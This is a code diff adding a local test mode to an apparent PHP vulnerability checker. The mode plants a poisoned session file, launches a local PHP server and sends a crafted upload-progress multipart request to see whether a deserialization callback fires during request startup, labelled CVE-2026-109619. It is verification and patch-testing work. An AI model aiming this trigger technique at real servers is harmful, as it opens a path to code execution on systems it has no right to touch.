@@ -58,6 +58,87 @@ def free_port():
     return p
 
 
+def local_mode(php_cli):
+    """Local decisive check: poisoned session + upload-progress trigger."""
+    ver = subprocess.run([php_cli, "-v"], capture_output=True, text=True)
+    print(f"binary : {php_cli}")
+    print(f"version: {(ver.stdout or '?').splitlines()[0]}")
+
+    td = tempfile.mkdtemp(prefix="sc109619-")
+    www, sess = os.path.join(td, "www"), os.path.join(td, "sess")
+    os.makedirs(www)
+    os.makedirs(sess)
+    open(os.path.join(www, "index.php"), "w").write("<?php echo 'ok';\n")
+    open(os.path.join(sess, f"sess_{SID}"), "wb").write(POISON)
+
+    port = free_port()
+    env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0")
+    srv = subprocess.Popen(
+        [php_cli, "-n", "-S", f"127.0.0.1:{port}", "-t", www,
+         "-d", "session.upload_progress.enabled=1",
+         "-d", "session.upload_progress.cleanup=0",
+         "-d", "session.upload_progress.min_freq=0",
+         "-d", "session.save_path=" + sess,
+         "-d", "unserialize_callback_func=var_dump",
+         "-d", "display_errors=1", "-d", "html_errors=0"],
+        env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    time.sleep(1.5)
+    try:
+        b = "----sc"
+        body = (f"--{b}\r\n"
+                'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
+                + SID + "\r\n"
+                f"--{b}\r\n"
+                'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
+                "\r\n\r\np\r\n"
+                f"--{b}\r\n"
+                'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
+                "Content-Type: text/plain\r\n\r\nZ\r\n"
+                f"--{b}--\r\n").encode()
+        req = (f"POST /index.php HTTP/1.1\r\nHost: h\r\n"
+               f"Content-Type: multipart/form-data; boundary={b}\r\n"
+               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
+               ).encode() + body
+        s = socket.create_connection(("127.0.0.1", port), timeout=30)
+        s.sendall(req)
+        out = b""
+        while True:
+            try:
+                d = s.recv(65536)
+            except socket.timeout:
+                break
+            if not d:
+                break
+            out += d
+        s.close()
+    finally:
+        srv.terminate()
+        try:
+            srv_out = srv.communicate(timeout=5)[0] or b""
+        except subprocess.TimeoutExpired:
+            srv.kill()
+            srv_out = b""
+
+    combined = out + srv_out
+    # PHP >= 8.1 prints "PHP Request Startup:", PHP 8.0 prints "Unknown:"
+    fired = MARKER_TAIL in combined and (
+        b"Request Startup" in combined or b"Unknown:" in combined)
+    print("startup-callback-fired:", fired)
+    for line in combined.splitlines():
+        if b"Request Startup" in line or b"Unknown:" in line or b"hasn't defined" in line:
+            print("  ", line.decode("latin1", "replace")[:140])
+
+    if fired:
+        print("VULNERABLE: internal function invoked during request startup via the "
+              "pre-RINIT session decode (CVE-2026-109619 user-code gap).")
+        return 1
+    if b"ok" in out:
+        print("SAFE: no startup callback; incomplete-classes-only decode (fix present).")
+        return 0
+    print("INCONCLUSIVE: unexpected output.")
+    return 2
+
+
 def main():
     import argparse
     import json
